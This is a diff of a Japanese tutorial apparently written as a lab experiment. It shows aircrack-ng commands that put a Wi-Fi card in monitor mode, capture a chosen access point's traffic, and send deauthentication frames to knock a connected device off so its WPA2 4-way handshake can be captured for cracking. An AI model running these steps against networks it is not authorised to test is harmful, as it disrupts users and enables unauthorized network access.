@@ -3,7 +3,6 @@
 本記事では、以下の環境を使って実験を行なった。
 
 - Kali-Linux(Virtual Box)
-- Ubuntu20.04
 
 ## コマンドを入力するとは?
 - 昔のコンピュータにはマウスを使って直感的に操作することはできず、コマンド入力によってコンピュータを操作していた。
@@ -34,13 +33,6 @@ ALFA AWUS036ACHのドライバーは公式サイトの[ドライバのインス�
 sudo apt update
 sudo apt install realtek-rtl88xxau-dkms
 ```
-- Ubuntuの場合はaptから直接インストールできないので[ドライバのインストールガイド](https://blog.abysm.org/2020/03/realtek-802-11ac-usb-wi-fi-linux-driver-installation/)からdebファイルをダウンロードした後、apt installにdebファイルを指定してインストールを行う。
-
-```shell
-#ubuntu
-sudo apt update
-sudo apt install ./realtek-rtl88xxau-dkms_5.6.4.2~git20200916-0kali1_all.deb
-```
 
 ### 認識されているか確認
 
@@ -55,8 +47,6 @@ sudo iwconfig #wlan0等のネットワークインターフェースカードが
 
 ![手順2](/home/tomita/article/picture/vm2.jpg)
 ******
-
-
 
 
 
@@ -135,8 +125,8 @@ sudo iwconfig
 - もしくは、airmon-ngをstopしてもよい。
 
 ```shell
-sudo airmon-ng stop wlp2s0mon
-sudo ip link set dev wlp2s0 up
+sudo airmon-ng stop wlan0
+sudo ip link set dev wlan0 up
 ```
 
 #### 周囲のWi-Fi情報を見る
@@ -146,7 +136,7 @@ sudo ip link set dev wlp2s0 up
 > SSIDステルスとは: 無線ルータが自らのSSIDを発信するためのビーコン信号を停止して、SSID一覧から見えなくすること。
 
 ```shell
-sudo airodump-ng wlp2s0mon #周囲のWi-Fi情報を取得する。
+sudo airodump-ng wlan0 #周囲のWi-Fi情報を取得する。
 ```
 - 攻撃対象とするアクセスポイントには既に他の端末が接続されていることが必要となる。ここでその端末のMACアドレスをメモする。
 ![アクセスポイントに接続している端末](/home/tomita/article/picture/alreadyconnect.png)
@@ -166,7 +156,7 @@ CH→5
 ### 2. 4 way handshakeキャプチャできる状態にする
 
 ```shell
-sudo airodump-ng -c 5 --bssid d6:48:8f:65:0c:27 -w wpa2 wlp2s0mon #-cでチャンネルを設定
+sudo airodump-ng -c 5 --bssid d6:48:8f:65:0c:27 -w wpa2 wlan0 #-cでチャンネルを設定
 ```
 ### 3. 端末のwifi接続を強制的に切り、4 way handshakeをキャプチャする
 - WPAのクラッキングでは、4 way handshakeという通信を開始する手順で送信されるメッセージ4を止めるてパケットをキャプチャする必要がある。
@@ -175,7 +165,7 @@ sudo airodump-ng -c 5 --bssid d6:48:8f:65:0c:27 -w wpa2 wlp2s0mon #-cでチャ�
 #### すでに接続されている端末の接続を強制的に切る。
 
 ```shell
-sudo aireplay-ng -0 1 -a <BSSID> -c <接続済み端末のMACアドレス> wlp2s0mon #-0で認証を無効化して引数の数(1)回それを行う。
+sudo aireplay-ng -0 1 -a <BSSID> -c <接続済み端末のMACアドレス> wlan0 #-0で認証を無効化して引数の数(1)回それを行う。
 ```
 - コマンド実行後に少し待つと、自動再接続が行われる。
 - 4way handshakeをキャプチャするとパケットをキャプチャしている画面に「WPA handshake」と表示されるので確認後にキャプチャを終了する。
